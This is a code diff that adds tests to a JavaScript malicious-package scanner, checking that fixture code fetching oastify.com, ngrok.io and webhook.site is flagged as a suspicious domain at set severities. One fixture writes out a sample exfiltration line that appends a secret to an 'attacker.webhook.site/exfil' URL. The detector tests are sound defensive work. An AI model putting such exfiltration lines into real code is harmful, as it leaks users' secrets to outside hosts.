@@ -925,6 +925,48 @@ const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });
       assert(t, 'Should detect nslookup in exec() as dangerous_exec');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- Suspicious domain detection ---
+
+  await asyncTest('DOMAIN: Detects oastify.com as HIGH severity', async () => {
+    const tmp = makeTempPkg(`const url = "https://abc123.oastify.com/collect";\nfetch(url);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain');
+      assert(t, 'Should detect oastify.com as suspicious domain');
+      assert(t.severity === 'HIGH', 'oastify.com should be HIGH severity');
+      assertIncludes(t.message, 'oastify.com', 'Message should include domain name');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DOMAIN: Detects ngrok.io as MEDIUM severity', async () => {
+    const tmp = makeTempPkg(`const endpoint = "https://abc123.ngrok.io/api/data";\nfetch(endpoint);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain');
+      assert(t, 'Should detect ngrok.io as suspicious domain');
+      assert(t.severity === 'MEDIUM', 'ngrok.io should be MEDIUM severity');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DOMAIN: Legitimate domain does NOT trigger', async () => {
+    const tmp = makeTempPkg(`const url = "https://api.github.com/repos";\nfetch(url);`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain');
+      assert(!t, 'Should NOT detect github.com as suspicious domain');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('DOMAIN: Detects domain embedded in full URL', async () => {
+    const tmp = makeTempPkg(`const callback = "https://attacker.webhook.site/exfil?data=" + secret;`);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_domain');
+      assert(t, 'Should detect webhook.site in full URL');
+      assert(t.severity === 'HIGH', 'webhook.site should be HIGH severity');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runAstTests };
